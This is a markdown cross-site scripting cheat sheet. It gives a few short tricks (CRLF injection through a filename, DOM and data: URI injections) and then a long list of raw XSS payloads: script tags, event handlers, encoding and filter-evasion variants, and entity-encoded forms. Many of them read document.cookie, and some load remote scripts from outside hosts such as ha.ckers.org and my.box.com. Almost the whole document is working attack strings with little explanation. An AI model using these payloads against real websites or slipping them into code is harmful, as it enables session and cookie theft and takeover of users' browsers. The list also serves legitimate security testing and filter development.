# XSS

- XSS tricks:
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```


**Bypassing file content restrictions:**
```
in some cases you can do a crlf injection via filename
x.png%22%0d%0a%0d%0a%0d%0a<script>alert(1)</script>

this will cause Content-Disposition to throw its content into the file
```



**Nice DOM XSS:**
```
','z':alert(1)//
http://example.com/','z':alert(1)//
```

**MALFORMED URL:**
```
%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e
```

**DATA:TEXT**

```
html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=,
```
```
data:text/html;var%20text=text;var%20html=html;alert(xss)//;base64,PGh0bWw+PGJvZHkgb25sb2FkPXhzcygpPjxzY3JpcHQ+IGZ1bmN0aW9uIHhzcygpIHsgcGFyZW50LnBvc3RNZXNzYWdlKHsneHNzJzogIm4wdG0zIn0sICcqJyk7IH07IDwvc2NyaXB0Pg==
```
```
data:text/html,alert()//%253Csvg/onload=%27top.postMessage(%7B%22text%22:%201%7D,%20%22*%22);top.postMessage(%7B%22html%22:%201%7D,%20%22*%22)%27%253E
```
```
data:text/html;var%20text=alert%28%29;var%20html;base64,YWE8c3ZnL29ubG9hZD0idG9wLnBvc3RNZXNzYWdlKDAsJyonKSI+11
```
```
data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
```
```
data:text/html,alert(document.domain)//%253C%2553cript%253Ewindow.parent.postMessage({text:%22%22,html:%22%22}%2C%20%22*%22)%253C%2F%2553cript%253E
```




- Basic


`<script>alert("xss")</script>`

`<img src="xss.gif" onerror="alert(1)">`

`<img src="xss.gif" onerror="alert('xss')">`














```
¼script¾alert(¢XSS¢)¼/script¾
žscriptualert(EXSSE)ž/scriptu
‘)alert(1);//
‘; alert(1);
‘; alert(document.cookie); var foo=’
‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“);alert(“Xss”);//
“><<script>alert(document.cookie);//<</script>
“><IMG SRC=x onerror=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
“><IMG SRC=x onerror=javascript:alert(&quot;Xss&quot;)>
“><ScRiPt>alert(“Xss”)</sCrIpT>
“><ScRiPt>alert(document.cookie)</script>
“><a XSS-test href=jAvAsCrIpT&colon;prompt&lpar;/Xss-By-Muhaddi/&rpar;>ClickMe
“><a href=javascript:alert(/Xss/)Click Me</a>
“><a id=”a”href=javascript&colon;a\u006cer\u0074&lpar;/Xss-By-Muhaddi/&rpar; id=”xss-test”>Click me</a>#a <
“><body/onload=alert(“Xss”)>
“><detials ontoggle=confirm(0)>
“><h1 onmouseover=alert(“Xss”)>Hover Me</h1>
“><h1/onclick=a\u006cer\u0074(/Xss-By-Muhaddi/)>Click Me</h1>
“><iFrAmE/src=jAvAscrIpT:alert(/Xss/)>
“><img onmouseover=alert(“Xss”)>
“><s”%2b”cript>alert(/Xss/)</script>
“><s”%2b”cript>alert(document.cookie)</script>
“><script>alert(“XSS”)</script>
“><script>alert(“Xss”)</script>
“><script>alert(/Xss/)</script>
“><svg/onload=prompt(“Xss”)>
“><test onclick=alert(/Xss/)>Click Me</test>
“x:expr/**/ession(alert(1))”
�</form><input type="date" onfocus="alert(1)">
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
!--" /><script>alert('xss');</script>
" onfocus=alert(document.domain) "> <"
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"--></style></script><script>alert("XSS")</script>
"/></a></><img src=1.gif onerror=alert(1)>
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
"<style><img src='</style><img src=x onerror=alert("document.cookie")//'>
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
"></iframe><script>alert(123)</script>
"></iframe><script>alert(`TEXT YOU WANT TO BE DISPLAYED`);</script><iframe frameborder="0%EF%BB%BF
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
"><STYLE>@import"javascript:alert('XSS')";</STYLE>>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
"><font size=70 color=red>
"><h1/onmouseover='\u0061lert(1)'>
"><h1><IFRAME SRC="javascript:alert('XSS');"></IFRAME>">123</h1>
"><h1><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(document.cookie)"></IFRAME>123</h1>
"><h1><iframe width="420" height="315" src="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" allowfullscreen></iframe>123</h1>
"><img src=x onerror='alert(document.domain)'>
"><img src=x onerror='alert(xzz)'>
"><img src=x onerror=javascript:alert("1")>
"><img src=x onerror=javascript:alert("A")>
"><img src=x onerror=javascript:alert('1')>
"><img src=x onerror=javascript:alert('A')>
"><img src=x onerror=javascript:alert(("1"))>
"><img src=x onerror=javascript:alert(("A"))>
"><img src=x onerror=javascript:alert(('1'))>
"><img src=x onerror=javascript:alert(('A'))>
"><img src=x onerror=javascript:alert((A))>
"><img src=x onerror=javascript:alert((`1`))>
"><img src=x onerror=javascript:alert((`A`))>
"><img src=x onerror=javascript:alert(1)>
"><img src=x onerror=javascript:alert(A)>
"><img src=x onerror=javascript:alert(`1`)>
"><img src=x onerror=javascript:alert(`A`)>
"><img src=x onerror=prompt(/xss by me/)>
"><img src=x onerror=prompt(0)>
"><img src=x onerror=prompt(1)>
"><img src=x onerror=window.open('https://www.google.com/');>
"><s"%2b"cript>alert(document.cookie)</script>
"><script alert(String.fromCharCode(88,83,83))</script>
"><script>alert(“XSS”);</script>
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
"><script>alert('XSS')</script>
"><script>alert('xss message')</script>
"><script>alert(0)</script>
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
"><script>alert(document.cookie)</script>
"><script>alert(document.cookie)</script>/><':
"><script>alert(document.location)</script><"
"><svg onload="prompt(/xss/)"></svg>
"><svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
">></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"onmouseover="alert(1)
"};alert(23);a={"a":
%22%3B%3E%3Cscript%3Ealert(String.fromCharCode(73,69,82,82,69%3B%3C%2Fscript%3E
%22%3E%3C/script%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
%22%3E%3Cimg%20src=k%20onerror=alert%28%22XSS%22%29%20/%3E
%22%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E
%22%3e%3cscript%3ealert('XSS')%3c/script%3e
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
%2527%257Calert%2528%2527XSS%2527%2529%257C%2527
%253cscript%253ealert(1)%253c/script%253e
%253cscript%253ealert(document.cookie)%253c/script%253e
%253script%253ealert(/Xss/)%253c/script%253e
%27|alert%28%27XSS%27%29|%27
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
%3C
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e
%3cscript%3ealert('XSS')%3c/script%3e
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE
&#0000060
&#000060
&#00060
&#0060
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#060
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#60
&#X000003C
&#X000003C;
&#X000003c
&#X000003c;
&#X00003C
&#X00003C;
&#X00003c
&#X00003c;
&#X0003C
&#X0003C;
&#X0003c
&#X0003c;
&#X003C
&#X003C;
&#X003c
&#X003c;
&#X03C
&#X03C;
&#X03c
&#X03c;
&#X3C
&#X3C;
&#X3c
&#X3c;
&#x000003C
&#x000003C;
&#x000003c
&#x000003c;
&#x00003C
&#x00003C;
&#x00003c
&#x00003c;
&#x0003C
&#x0003C;
&#x0003c
&#x0003c;
&#x003C
&#x003C;
&#x003c
&#x003c;
&#x03C
&#x03C;
&#x03c
&#x03c;
&#x3C
&#x3C;
&#x3c
&#x3c;
&<script>document.vulnerable=true;</script>
&LT
&LT;
&a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt
&lt;
&lt;!&#91;endif&#93;--&gt;
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
&lt;!--&#91;if gte IE 4&#93;&gt;
&lt;!--[if gte IE 4]&gt;
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;/br style=a:expression(alert())&gt;
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
&lt;? echo(&apos;&lt;SCR)&apos;;
&lt;? echo('&lt;SCR)';
&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;
&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;
&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
&lt;BR SIZE=\"&{alert('XSS')}\"&gt;
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
&lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;
&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;
&lt;HTML xmlns:xss&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;
&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
&lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;
&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;
